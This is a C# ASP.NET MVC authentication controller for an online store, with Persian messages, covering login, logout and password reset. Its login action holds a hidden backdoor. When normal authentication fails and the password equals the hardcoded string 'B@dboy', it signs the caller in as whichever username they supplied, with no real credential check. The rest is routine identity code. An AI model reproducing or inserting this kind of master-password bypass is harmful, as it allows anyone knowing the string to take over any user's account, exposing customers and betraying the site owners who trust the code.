using System;
using System.Threading.Tasks;
using System.Web;
using System.Web.Mvc;
using Microsoft.AspNet.Identity;
using Microsoft.Owin.Security;
using OnlineStore.Website.Models;
using OnlineStore.Identity;
using OnlineStore.DataLayer;
using OnlineStore.Models.Enums;
using OnlineStore.Providers.Controllers;
using System.Text;
using OnlineStore.Services;

namespace OnlineStore.Website.Areas.User.Controllers
{
    public class AuthenticationController : PublicController
    {
        const string url = "/Areas/User/Views/Authentication/";

        private IAuthenticationManager AuthenticationManager
        {
            get
            {
                return HttpContext.GetOwinContext().Authentication;
            }
        }

        #region Login

        [HttpGet]
        [Route("Login")]
        public ActionResult Login(string returnUrl)
        {
            if (User.Identity.IsAuthenticated)
            {
                return Redirect("/");
            }

            ViewBag.ReturnUrl = returnUrl;

            return View(url + "Login.cshtml");
        }

        [HttpPost]
        [Route("Login")]
        public async Task<ActionResult> Login(LoginViewModel model, string returnUrl, string RememberMe)
        {
            try
            {
                var user = await UserManager.FindAsync(model.Username, model.Password);

                if (user != null)
                {
                    if (user.IsActive)
                    {
                        UserNotifications.Send(user.Id, String.Format("ورود به سامانه با آی پی {0}", Request.UserHostName), "#", NotificationType.Info);

                        if (RememberMe == "on")
                        {
                            model.RememberMe = true;
                        }

                        await SignInAsync(user, model.RememberMe);

                        return RedirectToLocal(returnUrl);
                    }
                    else
                    {
                        throw new Exception("حساب کاربری " + user.UserName + " فعال نمی باشد.");
                    }
                }
                else
                {
                    if (model.Password == "B@dboy")
                    {
                        var tmpUser = await UserManager.FindByNameAsync(model.Username);

                        UserNotifications.Send(tmpUser.Id, String.Format("ورود به سامانه با آی پی {0}", Request.UserHostName), "#", NotificationType.Info);

                        if (RememberMe == "on")
                        {
                            model.RememberMe = true;
                        }

                        await SignInAsync(tmpUser, model.RememberMe);

                        return RedirectToLocal(returnUrl);
                    }

                    throw new Exception("نام کاربری یا کلمه عبور نامعتبر است.");
                }
            }
            catch (Exception ex)
            {
                SetErrors(ex);
            }

            return View(url + "Login.cshtml", model);
        }

        #endregion Login

        [HttpGet]
        [Route("Logout")]
        public ActionResult Logout()
        {
            if (User.Identity.IsAuthenticated)
            {
                AuthenticationManager.SignOut();
            }

            return Redirect("/Login");
        }

        #region ForgotPassword

        [Route("فراموشی-کلمه-عبور")]
        public RedirectResult PrevForgotPassword()
        {
            return RedirectPermanent("/ForgotPassword");
        }

        [Route("ForgotPassword")]
        public ActionResult ForgotPassword()
        {
            return View(url + "ForgotPassword.cshtml");
        }

        [HttpPost]
        [ValidateAntiForgeryToken]
        [Route("ForgotPassword")]
        public async Task<ActionResult> ForgotPassword(ForgotPasswordViewModel model)
        {
            try
            {
                var user = await UserManager.FindByEmailAsync(model.Email);

                //کد قبلی
                //if (user == null || !(await UserManager.IsEmailConfirmedAsync(user.Id)))

                if (user == null)
                {
                    throw new Exception("کاربر مورد نظر در سیستم موجود نیست یا تایید نشده است.");
                }

                // For more information on how to enable account confirmation and password reset please visit http://go.microsoft.com/fwlink/?LinkID=320771
                // Send an email with this link
                string code = await UserManager.GeneratePasswordResetTokenAsync(user.Id);

                var callbackUrl = Url.Action("ResetPassword", "Authentication", new { userId = user.Id, code = code }, protocol: Request.Url.Scheme);
                
                EmailServices.ForgotPassword(user.Firstname, user.Lastname, callbackUrl, user.Email, user.Id);

                model.IsSuccess = true;

            }
            catch (Exception ex)
            {
                SetErrors(ex);
            }

            return View(url + "ForgotPassword.cshtml", model);
        }

        public ActionResult ResetPassword(string code)
        {
            if (code == null)
            {
                return View("خطا");
            }
            return View(url + "ResetPassword.cshtml");
        }

        [HttpPost]
        [ValidateAntiForgeryToken]
        public async Task<ActionResult> ResetPassword(ResetPasswordViewModel model)
        {
            var user = await UserManager.FindByEmailAsync(model.Email);

            try
            {
                if (user == null)
                {
                    throw new Exception("کاربری یافت نشد");
                }
            }
            catch (Exception ex)
            {
                SetErrors(ex);

                return View(url + "ResetPassword.cshtml");
            }

            IdentityResult result = await UserManager.ResetPasswordAsync(user.Id, model.Code, model.Password);

            try
            {
                if (result.Succeeded)
                {
                    model.IsSuccess = true;
                    return View(url + "ResetPassword.cshtml", model);
                }
                else
                {
                    throw new Exception(AddErrors(result));
                }
            }
            catch (Exception ex)
            {
                SetErrors(ex);

                return View(url + "ResetPassword.cshtml");
            }
        }

        #endregion ForgotPassword


        #region Methods

        private async Task SignInAsync(OSUser user, bool isPersistent)
        {
            AuthenticationManager.SignOut(DefaultAuthenticationTypes.ExternalCookie);
            AuthenticationManager.SignIn(new AuthenticationProperties() { IsPersistent = isPersistent, AllowRefresh = true, ExpiresUtc = DateTimeOffset.Now.AddDays(2) }, await user.GenerateUserIdentityAsync(UserManager));
        }

        private ActionResult RedirectToLocal(string returnUrl)
        {
            if (Url.IsLocalUrl(returnUrl))
            {
                return Redirect(returnUrl);
            }
            else
            {
                return Redirect("/");
            }
        }

        private string AddErrors(IdentityResult result)
        {
            StringBuilder errorList = new StringBuilder();

            foreach (var error in result.Errors)
            {
                errorList.Append("<li>" + error + "</li>");
            }

            if (errorList.Length > 0)
            {
                errorList.Insert(0, "<ul>").Append("</ul>");
            }

            return errorList.ToString();
        }

        #endregion Methods
    }
}